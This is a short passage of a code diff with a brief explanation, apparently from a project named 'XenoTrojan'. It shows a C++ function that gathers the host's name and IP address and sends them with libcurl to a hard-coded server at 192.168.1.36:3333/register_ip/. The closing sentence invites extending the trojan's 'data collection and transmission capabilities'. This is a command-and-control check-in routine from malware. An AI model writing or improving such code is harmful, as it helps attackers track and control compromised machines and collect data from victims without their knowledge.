@@ -202,7 +202,8 @@ void c() {
     string ip = exec(cmd.c_str());
     ip.erase(remove(ip.begin(), ip.end(), '\n'), ip.end());
 
-    string url = "http:
+    string url = "http://192.168.1.36:3333/register_ip/";  
+
     string data = "{\"hostname\": \"" + hostname + "\", \"ip\": \"" + ip + "\"}";
 
     CURL *curl;
@@ -229,6 +230,7 @@ void c() {
 
     curl_global_cleanup();
 }
+
 ```
 
 This function fetches the hostname and corresponding IP address, constructs a JSON payload, and sends it to the FastAPI server using libcurl in C++. Adjustments to this function can enhance or modify the data collection and transmission capabilities of XenoTrojan.
